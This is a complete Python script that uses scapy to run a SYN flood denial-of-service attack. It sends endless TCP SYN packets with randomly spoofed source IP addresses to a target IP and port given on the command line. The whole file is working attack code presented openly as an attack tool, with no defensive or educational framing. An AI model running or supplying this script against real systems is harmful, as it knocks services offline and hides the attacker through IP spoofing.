#!/usr/bin/python3

import argparse
from os import system
from sys import stdout
from scapy.all import *
from random import randint

def get_args():
    parser = argparse.ArgumentParser(description='SYN Flood Attack --- Press CTRL+C to stop the attack!')
    parser.add_argument('--ip', required=True)
    parser.add_argument('--port', type=int, default=23)
    args = parser.parse_args()
    return args

def randomIP():
    ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
    return ip

def SYN_Flood(dstIP, dstPort):
    global total
    total = 0
    while True:
        sourcePort = randint(1000,9000)
        sequence = randint(1000,9000)
        window  = randint(1000,9000)

        IP_Packet = IP()
        IP_Packet.src = randomIP()
        IP_Packet.dst = dstIP

        TCP_Packet = TCP()
        TCP_Packet.sport = sourcePort
        TCP_Packet.dport = dstPort
        TCP_Packet.flags = "S"
        TCP_Packet.seq = sequence
        TCP_Packet.window = window

        send(IP_Packet/TCP_Packet, verbose=0)
        total+=1

def main():
    args = get_args()
    dstIP = args.ip
    dstPort = args.port
    SYN_Flood(dstIP,dstPort)


if __name__== '__main__':
    try:
        main()
    except KeyboardInterrupt:
        stdout.write("\nTotal packets sent: %i\n" % total)
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)
